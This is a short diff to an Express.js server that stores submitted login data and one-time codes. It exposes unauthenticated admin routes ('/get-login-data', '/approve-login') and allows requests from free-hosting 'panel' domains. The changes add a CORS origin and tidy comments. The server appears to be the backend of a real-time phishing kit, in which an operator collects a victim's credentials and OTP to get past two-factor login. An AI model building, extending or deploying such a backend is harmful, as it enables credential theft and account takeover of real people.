@@ -8,6 +8,7 @@ const app = express();
 const allowedOrigins = [
   'https://panel555.rf.gd',
   'https://wf1022.42web.io',
+  'https://optionz-backend.onrender.com',
   'http://localhost:3000',
 ];
 
@@ -33,9 +34,6 @@ let loginData = null;
 let approved = false;
 let otpApproved = false;
 
-/* ==============================
-   USER ROUTES
-============================== */
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -92,9 +90,7 @@ app.post('/verify-otp', (req, res) => {
   return res.json({ success: true, message: 'OTP approved, access granted' });
 });
 
-/* ==============================
-   ADMIN ROUTES (no Basic Auth)
-============================== */
+// Admin routes
 app.post('/approve-login', (req, res) => {
   if (!loginData) {
     return res.status(400).json({ message: 'No login data to approve' });
@@ -130,5 +126,5 @@ app.get('/get-login-data', (req, res) => {
 ============================== */
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`✅ Server running at https://my-node-backend-4nfy.onrender.com`);
+  console.log(`✅ Server running on port ${PORT}`);
 });
